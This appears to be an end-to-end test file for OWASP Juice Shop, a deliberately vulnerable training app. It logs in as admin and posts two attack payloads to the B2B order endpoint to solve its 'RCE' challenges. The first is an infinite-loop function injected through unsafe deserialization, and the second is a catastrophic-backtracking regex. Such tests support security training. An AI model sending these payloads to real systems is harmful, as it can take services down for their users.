const config = require('config')

describe('/b2b/v2/order', () => {
  protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

  describe('challenge "rce"', () => {
    it('an infinite loop deserialization payload should not bring down the server', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'(function dos() { while(true); })()\'});')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({challenge: 'RCE Tier 1'})
  })

  describe('challenge "rceOccupy"', () => {
    it('should be possible to cause request timeout using a recursive regular expression payload', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")\'});')
      browser.driver.sleep(3000) // 2sec for the deserialization timeout plus 1sec for Angular
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({challenge: 'RCE Tier 2'})
  })
})
